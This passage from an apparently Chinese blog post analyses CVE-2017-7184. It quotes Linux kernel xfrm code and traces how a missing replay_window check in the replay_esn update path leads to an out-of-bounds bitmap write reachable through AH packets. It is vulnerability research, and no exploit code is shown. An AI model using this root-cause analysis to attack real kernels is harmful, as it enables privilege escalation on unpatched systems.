rel=\"noopener\">xfrm_init_replay</a>函数中对上述申请的结构体数据进行检查，<code>replay_window</code>不大于定义的<code>bmp_len</code>大小，并对<code>x-&gt;repl</code>进行初始化，该成员是一个函数虚表，作用是在收到<code>AH</code>或<code>ESP</code>协议数据包时进行数据重放检查。</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">xfrm_init_replay</span><span class=\"params\">(struct xfrm_state *x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_replay_state_esn</span> *<span class=\"title\">replay_esn</span> = <span class=\"title\">x</span>-&gt;<span class=\"title\">replay_esn</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (replay_esn) {</span><br><span class=\"line\"><span class=\"keyword\">if</span> (replay_esn-&gt;replay_window &gt;</span><br><span class=\"line\"> replay_esn-&gt;bmp_len * <span class=\"keyword\">sizeof</span>(__u32) * <span class=\"number\">8</span>)<span class=\"comment\">//不大于bmp本身长度</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (x-&gt;props.flags &amp; XFRM_STATE_ESN) {</span><br><span class=\"line\"><span class=\"keyword\">if</span> (replay_esn-&gt;replay_window == <span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\">x-&gt;repl = &amp;xfrm_replay_esn;</span><br><span class=\"line\">} <span class=\"keyword\">else</span></span><br><span class=\"line\">x-&gt;repl = &amp;xfrm_replay_bmp;</span><br><span class=\"line\">} <span class=\"keyword\">else</span></span><br><span class=\"line\">x-&gt;repl = &amp;xfrm_replay_legacy;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\">EXPORT_SYMBOL(xfrm_init_replay);</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <h2 id=\"xfrm-replay-state-esn结构体更新\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#xfrm-replay-state-esn结构体更新\" class=\"headerlink\" title=\"xfrm_replay_state_esn结构体更新\"></a>xfrm_replay_state_esn结构体更新</h2>\n <p>对于一个<code>SA</code>，内核提供修改<code>replay_esn</code> 成员的功能，也就是<code>xfrm_alloc_replay_state_esn</code>申请的第一个内存块。在<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L1926\" target=\"_blank\" rel=\"noopener\">xfrm_new_ae</a>函数中，首先在[1]处循环查找哈希链表，得到<code>xfrm_state</code>结构体，查找标识是之前提到的三个要素。而在[2]处，对用户输入的<code>attr[XFRMA_REPLAY_ESN_VAL]</code>参数进行检查，也就是修改后的<code>replay_esn</code> 成员内容。最后在[3]处，利用<code>memcpy</code>进行成员内容修改。</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">xfrm_new_ae</span><span class=\"params\">(struct sk_buff *skb, struct nlmsghdr *nlh,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">struct nlattr **attrs)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">net</span> *<span class=\"title\">net</span> = <span class=\"title\">sock_net</span>(<span class=\"title\">skb</span>-&gt;<span class=\"title\">sk</span>);</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_state</span> *<span class=\"title\">x</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">km_event</span> <span class=\"title\">c</span>;</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> err = -EINVAL;</span><br><span class=\"line\">u32 mark = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_mark</span> <span class=\"title\">m</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_aevent_id</span> *<span class=\"title\">p</span> = <span class=\"title\">nlmsg_data</span>(<span class=\"title\">nlh</span>);</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlattr</span> *<span class=\"title\">rp</span> = <span class=\"title\">attrs</span>[<span class=\"title\">XFRMA_REPLAY_VAL</span>];</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlattr</span> *<span class=\"title\">re</span> = <span class=\"title\">attrs</span>[<span class=\"title\">XFRMA_REPLAY_ESN_VAL</span>];</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlattr</span> *<span class=\"title\">lt</span> = <span class=\"title\">attrs</span>[<span class=\"title\">XFRMA_LTIME_VAL</span>];</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlattr</span> *<span class=\"title\">et</span> = <span class=\"title\">attrs</span>[<span class=\"title\">XFRMA_ETIMER_THRESH</span>];</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlattr</span> *<span class=\"title\">rt</span> = <span class=\"title\">attrs</span>[<span class=\"title\">XFRMA_REPLAY_THRESH</span>];</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!lt &amp;&amp; !rp &amp;&amp; !re &amp;&amp; !et &amp;&amp; !rt)</span><br><span class=\"line\"><span class=\"keyword\">return</span> err;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* pedantic mode - thou shalt sayeth replaceth */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!(nlh-&gt;nlmsg_flags&amp;NLM_F_REPLACE))</span><br><span class=\"line\"><span class=\"keyword\">return</span> err;</span><br><span class=\"line\"></span><br><span class=\"line\">mark = xfrm_mark_get(attrs, &amp;m); <span class=\"comment\">//copy XFRMA_MARK变量，返回值是u32</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">1</span>]x = xfrm_state_lookup(net, mark, &amp;p-&gt;sa_id.daddr, p-&gt;sa_id.spi, p-&gt;sa_id.proto, p-&gt;sa_id.family); <span class=\"comment\">//循环查找hash表，得到xfrm_state结构体</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (x == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\"><span class=\"keyword\">return</span> -ESRCH;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (x-&gt;km.state != XFRM_STATE_VALID)</span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">2</span>]err = xfrm_replay_verify_len(x-&gt;replay_esn, re); <span class=\"comment\">//XFRMA_REPLAY_ESN_VAL参数检查</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (err)</span><br><span class=\"line\"><span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">spin_lock_bh(&amp;x-&gt;lock);</span><br><span class=\"line\">[<span class=\"number\">3</span>]xfrm_update_ae_params(x, attrs, <span class=\"number\">1</span>); <span class=\"comment\">//memcpy</span></span><br><span class=\"line\">spin_unlock_bh(&amp;x-&gt;lock);</span><br><span class=\"line\"></span><br><span class=\"line\">c.event = nlh-&gt;nlmsg_type;</span><br><span class=\"line\">c.seq = nlh-&gt;nlmsg_seq;</span><br><span class=\"line\">c.portid = nlh-&gt;nlmsg_pid;</span><br><span class=\"line\">c.data.aevent = XFRM_AE_CU;</span><br><span class=\"line\">km_state_notify(x, &amp;c);</span><br><span class=\"line\">err = <span class=\"number\">0</span>;</span><br><span class=\"line\">out:</span><br><span class=\"line\">xfrm_state_put(x);</span><br><span class=\"line\"><span class=\"keyword\">return</span> err;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>验证过程在<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L403\" target=\"_blank\" rel=\"noopener\">xfrm_replay_verify_len</a>函数中，可见在检查过程中主要检查了修改部分的<code>bmp_len</code>长度，该检查是因为<code>replay_esn</code>成员内存是直接进行复制的，不再二次分配。但缺少了对<code>replay_window</code>变量的检测，<strong>导致引用<code>replay_window</code>变量进行<code>bitmap</code>读写时造成的数组越界问题</strong>。</p>\n <figure class=\"highlight plain\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\">static inline int xfrm_replay_verify_len(struct xfrm_replay_state_esn *replay_esn,</span><br><span class=\"line\"> struct nlattr *rp)</span><br><span class=\"line\">{</span><br><span class=\"line\">struct xfrm_replay_state_esn *up;</span><br><span class=\"line\">int ulen;</span><br><span class=\"line\"></span><br><span class=\"line\">if (!replay_esn || !rp)</span><br><span class=\"line\">return 0;</span><br><span class=\"line\"></span><br><span class=\"line\">up = nla_data(rp);</span><br><span class=\"line\">ulen = xfrm_replay_state_esn_len(up);</span><br><span class=\"line\"></span><br><span class=\"line\">if (nla_len(rp) &lt; ulen || xfrm_replay_state_esn_len(replay_esn) != ulen) //自身长度逻辑正确，ulen与原len相同</span><br><span class=\"line\">return -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\">return 0;</span><br><span class=\"line\">}</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <h2 id=\"数组越界写定位\"><a href=\"http://p4nda.top/2019/02/16/CVE-2017-7184/#数组越界写定位\" class=\"headerlink\" title=\"数组越界写定位\"></a>数组越界写定位</h2>\n <p>通过对<code>xfrm</code>模块代码中，<code>replay_window</code>关键字的查找，可以发现主要对这个关键字的操作位于<code>xfrm_replay_advance_esn</code>和<code>xfrm_replay_check_esn</code>函数中。而通过这两个函数的查找发现二者位于同一 结构体<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_replay.c#L578\" target=\"_blank\" rel=\"noopener\">xfrm_replay_esn</a>下，</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br /></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_replay</span> <span class=\"title\">xfrm_replay_esn</span> = {</span></span><br><span class=\"line\">.advance= xfrm_replay_advance_esn,</span><br><span class=\"line\">.check= xfrm_replay_check_esn,</span><br><span class=\"line\">.recheck= xfrm_replay_recheck_esn,</span><br><span class=\"line\">.notify= xfrm_replay_notify_esn,</span><br><span class=\"line\">.overflow= xfrm_replay_overflow_esn,</span><br><span class=\"line\">};</span><br /></br></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>而定义这个结构体，可以发现这个结构体在之前提到过的<code>xfrm_init_replay</code>函数中被使用，并为<code>x-&gt;repl</code>成员赋值，因此转而寻找<code>x-&gt;repl</code>成员被调用的位置，最终跟踪到了<code>xfrm_input</code>函数，而<code>xfrm_input</code>函数之前被<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/include/net/xfrm.h#L1523\" target=\"_blank\" rel=\"noopener\">xfrm4_rcv_spi</a> &lt;= <a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/ipv4/xfrm4_input.c#L155\" target=\"_blank\" rel=\"noopener\">xfrm4_rcv</a> &lt;= <a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/ipv4/xfrm4_protocol.c#L118\" target=\"_blank\" rel=\"noopener\">xfrm4_ah_rcv</a> 最终追溯到<code>AH</code>协议的内核协议栈中。</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br /></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">net_protocol</span> <span class=\"title\">ah4_protocol</span> = {</span></span><br><span class=\"line\">.handler=xfrm4_ah_rcv,</span><br><span class=\"line\">.err_handler=xfrm4_ah_err,</span><br><span class=\"line\">.no_policy=<span class=\"number\">1</span>,</span><br><span class=\"line\">.netns_ok=<span class=\"number\">1</span>,</span><br><span class=\"line\">};</span><br /></br></br></br></br></br></pre></td>\n   </tr>\n  </table>\n </figure>\n <p>可见，通过发送<code>AH</code>数据包可以触发越界读写。</p>\n <p>在<a href=\"https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_input.c#L182\" target=\"_blank\" rel=\"noopener\">xfrm_input</a>函数中，首先在[1]处利用<code>AH</code>数据包数据找到对应的<code>SA</code>，在[2]处调用<code>xfrm_replay_check_esn</code>进行检查，再调用<code>xfrm_replay_recheck_esn</code>再次检查，最终在[3]处调用<code>xfrm_replay_advance_esn</code>。</p>\n <figure class=\"highlight c\">\n  <table>\n   <tr>\n    <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">xfrm_input</span><span class=\"params\">(struct sk_buff *skb, <span class=\"keyword\">int</span> nexthdr, __be32 spi, <span class=\"keyword\">int</span> encap_type)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">net</span> *<span class=\"title\">net</span> = <span class=\"title\">dev_net</span>(<span class=\"title\">skb</span>-&gt;<span class=\"title\">dev</span>);</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> err;</span><br><span class=\"line\">__be32 seq;</span><br><span class=\"line\">__be32 seq_hi;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_state</span> *<span class=\"title\">x</span> = <span class=\"title\">NULL</span>;</span></span><br><span class=\"line\"><span class=\"keyword\">xfrm_address_t</span> *daddr;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_mode</span> *<span class=\"title\">inner_mode</span>;</span></span><br><span class=\"line\">u32 mark = skb-&gt;mark;</span><br><span class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> family;</span><br><span class=\"line\"><span class=\"keyword\">int</span> decaps = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> async = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* A negative encap_type indicates async resumption. */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (encap_type &lt; <span class=\"number\">0</span>) { <span class=\"comment\">//here is zero</span></span><br><span class=\"line\">async = <span class=\"number\">1</span>;</span><br><span class=\"line\">x = xfrm_input_state(skb);</span><br><span class=\"line\">seq = XFRM_SKB_CB(skb)-&gt;seq.input.low;</span><br><span class=\"line\">family = x-&gt;outer_mode-&gt;afinfo-&gt;family;</span><br><span class=\"line\"><span class=\"keyword\">goto</span> resume;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">daddr = (<span class=\"keyword\">xfrm_address_t</span> *)(skb_network_header(skb) +</span><br><span class=\"line\"> XFRM_SPI_SKB_CB(skb)-&gt;daddroff);</span><br><span class=\"line\">family = XFRM_SPI_SKB_CB(skb)-&gt;family;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* if tunnel is present override skb-&gt;mark value with tunnel i_key */</span></span><br><span class=\"line\"><span class=\"keyword\">switch</span> (family) {</span><br><span class=\"line\"><span class=\"keyword\">case</span> AF_INET:</span><br><span class=\"line\"><span class=\"keyword\">if</span> (XFRM_TUNNEL_SKB_CB(skb)-&gt;tunnel.ip4) <span class=\"comment\">// p32</span></span><br><span class=\"line\">mark = be32_to_cpu(XFRM_TUNNEL_SKB_CB(skb)-&gt;tunnel.ip4-&gt;parms.i_key);</span><br><span class=\"line\"><span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"keyword\">case</span> AF_INET6:</span><br><span class=\"line\"><span class=\"keyword\">if</span> (XFRM_TUNNEL_SKB_CB(skb)-&gt;tunnel.ip6)</span><br><span class=\"line\">mark = be32_to_cpu(XFRM_TUNNEL_SKB_CB(skb)-&gt;tunnel.ip6-&gt;parms.i_key);</span><br><span class=\"line\"><span class=\"keyword\">break</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Allocate new secpath or COW existing one. */</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!skb-&gt;sp || atomic_read(&amp;skb-&gt;sp-&gt;refcnt) != <span class=\"number\">1</span>) {</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sec_path</span> *<span class=\"title\">sp</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">sp = secpath_dup(skb-&gt;sp);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!sp) {</span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMINERROR);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">if</span> (skb-&gt;sp)</span><br><span class=\"line\">secpath_put(skb-&gt;sp);</span><br><span class=\"line\">skb-&gt;sp = sp;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">seq = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!spi &amp;&amp; (err = xfrm_parse_spi(skb, nexthdr, &amp;spi, &amp;seq)) != <span class=\"number\">0</span>) { <span class=\"comment\">//spi =0</span></span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMINHDRERROR);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">do</span> {</span><br><span class=\"line\"><span class=\"keyword\">if</span> (skb-&gt;sp-&gt;len == XFRM_MAX_DEPTH) {</span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMINBUFFERERROR);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">1</span>]x = xfrm_state_lookup(net, mark, daddr, spi, nexthdr, family);<span class=\"comment\">//找到对应的xfrm_state</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (x == <span class=\"literal\">NULL</span>) {</span><br><span class=\"line\">XFRM_INC_STATS(net, LINUX_MIB_XFRMINNOSTATES);</span><br><span class=\"line\">xfrm_audit_state_notfound(skb, family, spi, seq);</span><br><span class=\"line\"><span class=\"keyword\">goto</span> drop;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">skb-&gt;sp-&gt;xvec[skb-&gt;sp-&gt;len++] = x;</span><br><span class=\"line\"></span><br><span class=\"line\">spin_lock(&amp;x-&gt;lock);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (unlikely(x-&gt;km.state != XFRM_STATE_VALID)) {</span><br><span class=\"line\"><span 